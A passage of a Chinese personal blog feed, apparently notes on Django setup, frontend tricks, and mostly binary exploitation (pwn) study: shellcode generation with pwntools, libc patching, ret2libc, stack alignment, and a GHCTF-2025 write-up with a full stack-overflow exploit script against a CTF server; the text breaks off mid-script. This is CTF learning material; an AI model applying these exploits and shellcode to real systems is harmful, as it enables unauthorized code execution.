    <url>/2025/03/09/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%81%94%E8%B0%83%E4%B9%8B%E5%90%8E%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<p>技术栈：<br>python+django+MySQL</p><ol><li><p>先激活虚拟环境</p></li><li><p>清空数据库 但保留数据库结构：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py flush --no-input<br></code></pre></td></tr></table></figure></li><li><p>安装相关依赖</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip install -r requirement.txt<br></code></pre></td></tr></table></figure></li><li><p>重新运行迁移</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py makemigrations<br>python manage.py migrate<br></code></pre></td></tr></table></figure></li><li><p>重新加载初始数据：(如果有)<br>有一个<code>initial_data.json</code>文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py loaddata initial_data.json<br></code></pre></td></tr></table></figure></li><li><p>启动服务器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python manage.py runserver<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前端如何mock数据</title>
    <link href="/2025/03/09/%E5%89%8D%E7%AB%AF%E5%A6%82%E4%BD%95mock%E6%95%B0%E6%8D%AE/"/>
    <url>/2025/03/09/%E5%89%8D%E7%AB%AF%E5%A6%82%E4%BD%95mock%E6%95%B0%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="创建本地JSON文件"><a href="#创建本地JSON文件" class="headerlink" title="创建本地JSON文件"></a>创建本地JSON文件</h1><ol><li><p>创建一个<code>data.json</code>文件<br>在里面写<code>json</code></p></li><li><p>通过<code>axios</code>或<code>fetch</code>请求本地JSON文件</p></li></ol><blockquote><p>参考：<br><a href="https://worktile.com/kb/p/3631378#:~:text=%E5%9C%A8Vue%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B8%AD%EF%BC%8CMock%E6%95%B0%E6%8D%AE%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B8%B8%E8%A7%81%E4%B8%94%E9%87%8D%E8%A6%81%E7%9A%84%E5%AE%9E%E8%B7%B5%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%9C%A8%E5%BC%80%E5%8F%91%E5%92%8C%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E6%A8%A1%E6%8B%9F%E5%90%8E%E7%AB%AFAPI%E7%9A%84%E5%93%8D%E5%BA%94%E3%80%82%201%E3%80%81%E4%BD%BF%E7%94%A8Mocking%E5%BA%93%E5%A6%82Mock.js%EF%BC%8C2%E3%80%81%E4%BD%BF%E7%94%A8%E6%9C%AC%E5%9C%B0JSON%E6%96%87%E4%BB%B6%EF%BC%8C3%E3%80%81%E9%80%9A%E8%BF%87Vue,CLI%E6%8F%92%E4%BB%B6%EF%BC%8C4%E3%80%81%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A3%E7%90%86%E3%80%82%20%E4%BB%A5%E4%B8%8B%E6%98%AF%E8%AF%A6%E7%BB%86%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E6%AD%A5%E9%AA%A4%EF%BC%9A%20Mock.js%E6%98%AF%E4%B8%80%E4%B8%AA%E6%B5%81%E8%A1%8C%E7%9A%84Mock%E5%BA%93%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%B9%B6%E6%8B%A6%E6%88%AAAjax%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BB%A5%E4%BE%BF%E5%9C%A8%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5%E6%A8%A1%E6%8B%9FAPI%E5%93%8D%E5%BA%94%E3%80%82">前端如何mock数据vue • Worktile社区</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前端实现扫描二维码</title>
    <link href="/2025/03/09/%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%8E%B0%E6%89%AB%E6%8F%8F%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
    <url>/2025/03/09/%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%8E%B0%E6%89%AB%E6%8F%8F%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h1><p>设计一下路径</p><pre><code class=" mermaid">graph TDA[A1] --&gt; C[B1]B[A2] --&gt; CC --&gt; D[C1]</code></pre><p>在线二维码生成器：<br><a href="https://www.hlcode.cn/?p=bd-kccs-sc-240912-1&bd_vid=4202142843968583576">互联二维码生成器_二维码在线制作_应用方案提供商</a></p><p>目标地点”A1” 作为文本<br>生成二维码：<br><img src="/2024/10/29/hello-world/hsX-EOQ6.png"></p><p>然后利用本地存储存下已经走过的路径即可</p><hr><p>可以将路径标记设计得更简洁一点：</p><pre><code class=" mermaid">graph TDA1[0] --&gt; B1[1]A2[0] --&gt; B1[1]B1 --&gt; C1[2]</code></pre><hr><h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><p>前端实现扫描和解析</p><blockquote><p>参考<br><a href="https://docs.pingcode.com/baike/2460094">扫描二维码前端如何实现 | PingCode智库</a><br><a href="https://www.cnblogs.com/wasbg/p/18468062">vue3+vite+ts+vue3-qr-reader实现移动端h5+pc端调起摄像头核销二维码 - 廖客 - 博客园</a></p></blockquote><p>发现一个不错的UI库：<br><a href="https://www.naiveui.com/zh-CN/os-theme/docs/installation">安装 - Naive UI</a></p><p>移动端UI组件库：vant</p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>流水线CPU</title>
    <link href="/2025/03/07/%E6%B5%81%E6%B0%B4%E7%BA%BFCPU/"/>
    <url>/2025/03/07/%E6%B5%81%E6%B0%B4%E7%BA%BFCPU/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>one_gadget</title>
    <link href="/2025/03/06/one_gadget/"/>
    <url>/2025/03/06/one_gadget/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.kanxue.com/thread-261112.htm">[原创]pwn中one_gadget的使用技巧-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://blog.csdn.net/m0_46687377/article/details/118223887">ubuntu中one_gadget的安装下载_onegadget下载-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2shellcode</title>
    <link href="/2025/03/05/ret2shellcode/"/>
    <url>/2025/03/05/ret2shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h1><p>无论是x86还是x86_64<br><code>call</code>指令的基本功能都是一致的</p><ol><li>保存返回地址<br>将下一条指令的地址（返回地址）压入栈中。</li><li>跳转到子程序<br><code>call</code>指令将程序的控制权转移到指定的目标地址</li></ol><hr><h1 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h1><h2 id="pwntools生成"><a href="#pwntools生成" class="headerlink" title="pwntools生成"></a>pwntools生成</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br></code></pre></td></tr></table></figure><p>shellcraft.sh():<br>生成获取<code>/bin/sh</code>的汇编指令<br>asm()：<br>将汇编指令汇编成字节码</p><hr><h2 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h2><p>ascii码转16进制在线工具：<br><a href="https://www.bchrt.com/tools/ascii-converter/">ASCII、十六进制、二进制、十进制、Base64转换器</a><br><a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online Assembler and Disassembler</a></p><blockquote><p>to learn:<br><a href="https://blog.csdn.net/j284886202/article/details/133924239">★pwn 手写Shellcode保姆级教程★_shellcode编写教程-CSDN博客</a></p></blockquote><hr><p>栈地址是每时每刻都在变的<br>且栈地址是不可事先知道的</p><hr><p>在做ctfshow的pwn60的时候<br>遇到了ida测量栈底距离出错的情况</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>更改pwn题libc</title>
    <link href="/2025/03/04/%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc/"/>
    <url>/2025/03/04/%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<br>  <a href="https://blog.csdn.net/j284886202/article/details/142406824">★pwn 更改pwn题libc保姆级教程★_pwn libc-CSDN博客</a></p></blockquote><h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h1><p>我已经有了<br><img src="/2024/10/29/hello-world/ile-20250304161304899.png"><br>仓库链接：<br><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p><h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>我也有了</p><h1 id="glibc-all-in-one下载与调整libc"><a href="#glibc-all-in-one下载与调整libc" class="headerlink" title="glibc-all-in-one下载与调整libc"></a>glibc-all-in-one下载与调整libc</h1><p>如果题目没有给libc<br>则需要泄漏并使用LibcSearcher</p><p>如果题目给了libc：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">strings libc.so.6 | grep ubuntu<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250304171540001.png"><br>glibc版本为2.23-0ubuntu11.3(主版本号-某一系统特定的版本修订号)<br>在glibc-all-in-one下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> list<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ile-20250304172105081.png"><br>可以查看所有能够下载的libc版本<br><img src="/2024/10/29/hello-world/ile-20250304172234119.png"></p><p>现在我们可以下载<code>2.23-0ubuntu11.3_amd64</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./download 2.23-0ubuntu11.3_amd64<br></code></pre></td></tr></table></figure><p>执行后即可下载<br>下载完它会保存在<code>~/glibc-all-in-one/libs</code>下<br><img src="/2024/10/29/hello-world/ile-20250304172528104.png"><br>进入该libc中<br><img src="/2024/10/29/hello-world/ile-20250304172733380.png"><br>可以发现有一个<code>.debug</code>目录，这个目录中保存了该libc的符号表信息<br>进入<code>.debug/lib/x86_64-linux-gnu</code>，可以找到<code>libc-2.23.so</code>文件<br><img src="/2024/10/29/hello-world/ile-20250304173311500.png"><br>将这个文件，放到<code>.debug/</code>目录下。<br>也可以把这些文件全部拖到<code>.debug/</code>下</p><p>这样，就可以在不动用gdb的命令的情况下，patchelf更改好文件libc后，<br>gdb打开后就能直接加载好符号表</p><p>但是，ubuntu版本在2.31和2.34后的符号信息表位置发生了些许变化</p><p>我们只需要省流操作：<br>在<code>.debug/</code>目录下执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> .build-id/*/* ./<br></code></pre></td></tr></table></figure><p>将<code>./build-id/</code>目录以及其子目录下的<strong>文件</strong>，都复制到<code>.debug/</code>目录下</p><hr><h1 id="使用patchelf"><a href="#使用patchelf" class="headerlink" title="使用patchelf"></a>使用patchelf</h1><blockquote><p>接下来， 是使用patchelf更改libc的操作</p></blockquote><p>先将<code>~/glibc-all-in-one/libs/</code>下的<code>2.23-0ubuntu11.3_amd64</code>移动到pwn题目文件的同级目录下，然后执行： 即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf &lt;fileName&gt; --set-interpreter ./2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ./2.23-0ubuntu3_amd64<br></code></pre></td></tr></table></figure><p><code>-set-interpreter</code>：设置ld，要指定为目录下的ld文件<br><code>-set-rpath</code>：设置了运行环境，要指定为libc的目录</p><p>2.25以上：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf &lt;fileName&gt; --set-interpreter ./2.35-0ubuntu3.8_amd64/ld-linux-x86-64.so.2 --set-rpath ./2.35-0ubuntu3.8_amd64<br></code></pre></td></tr></table></figure><p>(ld换成了默认的了，没有具体的版本名了)</p><hr><p>LibcSearcher项目<br><a href="https://github.com/zarkivy/LibcSearcher">zarkivy&#x2F;LibcSearcher: 🔍 LibcSearcher-ng – get symbols’ offset in glibc.</a></p><hr><p>学了一些命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">lsof | grep /path/to/your_binary<br></code></pre></td></tr></table></figure><p>查看目标程序的进程</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">killall -9 your_binary<br></code></pre></td></tr></table></figure><p>强制终止所有相关进程</p><hr><p>当<br><img src="/2024/10/29/hello-world/ile-20250328105141440.png"><br>可以使用<br><img src="/2024/10/29/hello-world/ile-20250328105201892.png"><br>然后再patchelf即可<br><img src="/2024/10/29/hello-world/ile-20250328105248641.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机使用技巧</title>
    <link href="/2025/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <url>/2025/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>ctrl+shift+v ： 以纯文本方式zhantie</p>]]></content>
    
    
    <categories>
      
      <category>chore</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>调用约定</title>
    <link href="/2025/03/04/%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2025/03/04/%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/10/29/hello-world/250304134808299.png"><img src="/2024/10/29/hello-world/250304134821104.png"><br>指针型即地址 int &amp; pointer</p><p><img src="/2024/10/29/hello-world/250304135441114.png"><br><img src="/2024/10/29/hello-world/250304135454173.png"></p><hr><p><img src="/2024/10/29/hello-world/250304135110837.png"><br><img src="/2024/10/29/hello-world/250304135121657.png"><br><img src="/2024/10/29/hello-world/250304135131124.png"></p><hr><p><img src="/2024/10/29/hello-world/250304135404493.png"></p><hr><p><img src="/2024/10/29/hello-world/250304135016471.png"></p><hr><p>32位系统调用<br>在执行<code>int 0x80</code>之前，通常不需要将参数压入栈中。参数是通过寄存器传递的，而不是通过栈传递的<br><code>call execve()</code><br><code>eax</code> 系统调用号 11  0x0b<br><code>ebx</code> 第一个参数 程序路径地址 <code>/bin///sh</code><br><code>ecx</code> 第二个参数 程序参数的地址（给程序传递的参数）<br><code>edx</code> 第三个参数 环境变量</p><p><img src="/2024/10/29/hello-world/250331214204044.png"><br>有一道32位题有<code>int 0x80</code>的地址，<br>我们可以调整寄存器中的值，然后跳转到<code>int 0x80</code>便可</p><hr><h1 id="函数调用规范（Calling-conventions）"><a href="#函数调用规范（Calling-conventions）" class="headerlink" title="函数调用规范（Calling conventions）"></a>函数调用规范（Calling conventions）</h1><p>stdcall</p><p>cdecl</p><p>fastcall</p><p>thiscall</p><p>naked call</p><p><a href="https://blog.csdn.net/qq_61553520/article/details/132520245">深入解析C&#x2F;C++调用约定：stdcall、cdecl、thiscall与fastcall详解-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C函数栈帧</title>
    <link href="/2025/03/04/C%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7/"/>
    <url>/2025/03/04/C%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7/</url>
    
    <content type="html"><![CDATA[<p>x86_64 &amp; x86<br>函数基本结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov  rbp, rsp<br>...<br>mov  rsp, rbp<br>pop  rbp<br>ret<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250304102527950.png"><br>进入新函数的栈帧前，要要将调用函数指令的下一条指令地址压入栈里（调用者的栈帧）。</p><h1 id="64位函数栈帧"><a href="#64位函数栈帧" class="headerlink" title="64位函数栈帧"></a>64位函数栈帧</h1><p>再调用新函数前<br><img src="/2024/10/29/hello-world/0250304114237239.png"><br>rsp是00<br>调用新函数后<br><img src="/2024/10/29/hello-world/0250304114328476.png"><br>先把下一条指令的地址：jmp main+175 压入栈<br>此时rsp是08<br>因此在新函数栈帧中第一个push前rsp需要是08</p><p>若涉及栈对齐问题<br>可考虑在返回地址处先塞一个 ret 指令的地址<br>或者跳过第一个push</p><p>ret &#x3D; pop ip(利用栈中的数据切换ip值)</p><p>像这种情况（ret2libc）<br><img src="/2024/10/29/hello-world/0250304115347445.png"><br>跳转到plt后<br>执行完plt中的句子<br>跳转到puts函数地址</p><h1 id="32位函数栈帧"><a href="#32位函数栈帧" class="headerlink" title="32位函数栈帧"></a>32位函数栈帧</h1>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwntools使用</title>
    <link href="/2025/03/04/pwntools%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/03/04/pwntools%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">exe = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="ELF对象的属性"><a href="#ELF对象的属性" class="headerlink" title="ELF对象的属性"></a>ELF对象的属性</h1><p><strong>四大用途</strong></p><ul><li><strong>sym 查找符号地址 符号表 函数、变量地址</strong></li><li><strong>plt 获取plt表地址</strong>  &#x3D;&#x3D;plt表和got表相比最重要的特性就是plt表可执行而got表不可执行 plt会跳转到相应函数处的地址&#x3D;&#x3D;  </li><li><strong>got 获取got表地址</strong></li><li><strong>查找字符串的地址 .search[b’&#x2F;bin&#x2F;sh’]</strong></li></ul><p><code>exe.symbols</code> <code>exe.sym</code><br><strong>字典</strong>，存储符号表（包括函数、全局变量）</p><p><code>exe.sym[&quot;main&quot;]</code><br><code>main</code>函数的地址</p><p><code>exe.got</code><br><strong>字典</strong>，存储GOT表中各函数的表项地址</p><p><code>exe.got[&quot;puts&quot;]</code><br><code>puts</code>在GOT表中的地址</p><p><code>exe.plt</code><br><strong>字典</strong>，存储PLT表中各函数的入口地址</p><p><code>exe.plt[&quot;puts&quot;]</code><br><code>puts</code>在PLT表中的入口地址</p><p><code>exe.symbols[&quot;puts&quot;]</code><br>简写<code>elf.sym</code><br>如果<code>puts</code>是静态链接，<br>会返回<code>puts</code>在<code>.text</code>段中的真实地址（<code>.puts</code>代码的起始地址）<br>如果<code>puts</code>是动态链接</p><ul><li>返回的是<code>puts@plt</code>,也就是<code>puts</code>在PLT中的地址</li><li>PLT只是一个跳转stub，并不是真正的<code>puts</code>实现</li><li>如果想要<code>puts</code>在<code>libc</code>中的真实地址，需要用<code>elf.got[&quot;puts&quot;]</code>，并在程序运行时解析它。</li></ul><p><strong>查找字符串</strong><br><code>exe.search[b&quot;/bin/sh&quot;]</code><br>在ELF文件中搜索字符串<code>/bin/sh</code>的地址<br><code>exe.search[b&quot;flag&quot;]</code><br>在ELF文件中搜索“flag”相关的字符串</p><h1 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h1><p>可能的误区是，pwntools在静态分析时给出的地址是相对于文件中的偏移，而不是实际运行时的绝对地址。</p><h1 id="python脚本常用语法"><a href="#python脚本常用语法" class="headerlink" title="python脚本常用语法"></a>python脚本常用语法</h1><hr><h1 id="gdb-attach-之掌握时机"><a href="#gdb-attach-之掌握时机" class="headerlink" title="gdb.attach()之掌握时机"></a>gdb.attach()之掌握时机</h1><p>最好在等待输入之间<br>在send之前加pause()</p><hr><h1 id="ELF对象于libcsearcher函数区别"><a href="#ELF对象于libcsearcher函数区别" class="headerlink" title="ELF对象于libcsearcher函数区别"></a>ELF对象于libcsearcher函数区别</h1><hr><p><a href="https://newym.github.io/2024/11/06/GDB%E8%B0%83%E8%AF%95%E6%8C%87%E5%8D%97/">PWN题GDB调试指南 | NEWYM</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc</title>
    <link href="/2025/03/03/ret2libc-1/"/>
    <url>/2025/03/03/ret2libc-1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>libc基地址 + 函数偏移量 &#x3D; 函数真实地址</p></blockquote><p>问题是&#x3D;&#x3D;怎么找libc基地址&#x3D;&#x3D;呢？<br>&#x3D;&gt; 泄漏一个函数的真实地址</p><blockquote><p>有时间了解一下 <em>libc的延迟绑定技术</em> <em>got表-plt表</em></p></blockquote><p>泄漏一个函数的真实地址<br>&#x3D;&gt; 一般方法是采用&#x3D;&#x3D;got表泄漏&#x3D;&#x3D;<br>以puts函数为例<br>只要之前执行过puts函数，got表里存放着的就是puts函数的真实地址了，<br>我们&#x3D;&#x3D;得到puts函数的got地址&#x3D;&#x3D;后，可以把这个地址作为参数传递给puts函数，则会把这个<strong>地址里的数据</strong>，即puts函数的真实地址给输出出来<br>&#x3D;&gt; 得到了函数的真实地址</p><blockquote><p>system地址 &#x3D; 基地址 + system偏移量<br>“&#x2F;bin&#x2F;sh”地址 &#x3D; 基地址 + “&#x2F;bin&#x2F;sh”偏移量</p></blockquote><hr><h2 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h2><p>存放动态链接库函数地址的内存区域</p><hr><h2 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h2><p>负责跳转到GOT表</p><hr><p><code>libc.so.6</code>是共享库（shared library）<br>它不会在内存中固定加载，而是动态加载到某个随机地址（受ASLR影响）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]))<br></code></pre></td></tr></table></figure><p>这个值是<code>puts</code>在<code>libc.so.6</code>文件中的固定偏移</p><hr>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈对齐</title>
    <link href="/2025/03/03/%E6%A0%88%E5%AF%B9%E9%BD%90/"/>
    <url>/2025/03/03/%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
    
    <content type="html"><![CDATA[<h1 id="加ret"><a href="#加ret" class="headerlink" title="加ret"></a>加ret</h1><h1 id="跳push"><a href="#跳push" class="headerlink" title="跳push"></a>跳push</h1><p>需要花时间总结下<br>加pop行不行？<br><a href="https://blog.csdn.net/ATFWUS/article/details/104565483#:~:text=%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9A%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://pan.baidu.com/s/1Lncq6vrUNEJ7vLKvTQ_gsA">ROP-基础-ret2libc2_ret2libc2下载-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GHCTF-2025_wp</title>
    <link href="/2025/03/03/GHCTF-2025-wp/"/>
    <url>/2025/03/03/GHCTF-2025-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello_world"></a>Hello_world</h1><p>给了后门函数，基本的栈溢出<br><img src="/2024/10/29/hello-world/p/file-20250303200604157.png"><br>有pie</p><p>partial write + 栈对齐<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span><br>    addr_backdoor = <span class="hljs-number">0x09C2</span><br>    payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + p16(addr_backdoor)<br>    <span class="hljs-comment"># p = process(&quot;./attachment&quot;)</span><br>    <span class="hljs-comment"># p = gdb.debug(&quot;./attachment&quot;, &quot;b *main&quot;)</span><br>    <span class="hljs-comment"># node2.anna.nssctf.cn:28200</span><br>    p = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28200</span>)<br>    <span class="hljs-comment"># pause()</span><br>    p.sendafter(<span class="hljs-string">&quot;Hello pwner!\n&quot;</span>,payload)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>有点意思<br>在<code>buy my shop</code>函数处有栈溢出<br>可以控制函数执行流程进行ret2libc</p><p><img src="/2024/10/29/hello-world/p/file-20250303221326376.png"><br>没有开启pie<br>需要考虑栈对齐<br>因为没有开启pie，所以可以利用ret gadgets栈对齐<br><img src="/2024/10/29/hello-world/p/file-20250304132008548.png"><img src="/2024/10/29/hello-world/p/file-20250304132413453.png"></p><p>做这题我刚开始蠢了，<br>64位通过寄存器传递参数，<br>我一开始tm的还用栈传递了参数<br>结果是<br><img src="/2024/10/29/hello-world/p/file-20250304134032978.png"><br>参数传递顺序<br>rdi rsi rdx rcx r8 r9<br>寻找gadgets:<br><img src="/2024/10/29/hello-world/p/file-20250304135630238.png"><br>使用LibcSearcher的话本地可以打通<br><img src="/2024/10/29/hello-world/p/file-20250304153121303.png"><br>本地可以打通<br><img src="/2024/10/29/hello-world/p/file-20250304153233367.png"><br>但是远程无法打通，可能是不能找到正确的libc版本<br>（ps: libcsearcher最多只有10个吗？）</p><p>然而用题目所给的libc可以打通远程，却无法打通本地<br>是因为本地默认用的是系统的libc，而非远程libc<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 